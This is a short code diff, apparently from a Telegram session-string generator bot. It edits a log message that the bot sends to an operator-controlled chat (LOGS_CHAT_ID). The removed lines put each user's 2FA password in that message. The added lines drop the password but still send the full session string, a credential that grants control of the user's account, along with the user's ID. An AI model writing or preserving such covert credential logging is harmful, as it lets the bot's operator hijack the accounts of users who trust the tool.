@@ -147,10 +147,10 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
      # Send log message to log channel
     account_type = "Bot" if is_bot else "Private Account"
     log_message = (
-        f"**✨New Login ({account_type})**\n\n"
-        f"**✨User ID:** [{msg.from_user.first_name}](tg://user?id={msg.from_user.id}) `{msg.from_user.id}`\n\n"
-        f"**✨Session String ↓**\n`{string_session}`\n"
-        f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
+    f"**✨New Login ({account_type})**\n\n"
+    f"**✨User ID:** [{msg.from_user.first_name}](tg://user?id={msg.from_user.id}) `{msg.from_user.id}`\n\n"
+    f"**✨Session String ↓**\n`{string_session}`\n"
+    f"**✨2FA Password:** `{'Set' if 'password' in locals() else 'None'}`"
     )
     await bot.send_message(LOGS_CHAT_ID, log_message)
 
